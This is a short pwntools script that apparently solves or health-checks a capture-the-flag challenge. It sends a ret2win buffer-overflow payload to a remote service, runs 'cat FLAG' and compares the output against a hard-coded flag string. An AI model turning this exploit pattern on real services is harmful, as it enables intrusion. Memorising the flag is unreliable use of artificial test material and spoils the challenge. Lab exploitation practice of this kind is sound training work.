from pwn import *
import sys
from time import sleep


def pwn_ret2win(host):
    elf = ELF("chall")
    try:
        io = remote(host, 9003, timeout=3)
    except Exception:
        return 2

    p = b"A" * 40
    p += p64(elf.sym["win"])
    io.sendlineafter(b"(max. 48 bytes) > ", p, timeout=3)

    sleep(3)
    io.sendline(b"cat FLAG")
    r = io.recvuntil(b"}", timeout=3)
    if b"FLAG{f1r57_5739_45_4_9wn3r}" in r:
        return 0
    else:
        return 1


if __name__ == "__main__":
    if pwn_ret2win(sys.argv[1]) != 0:
        exit(1)
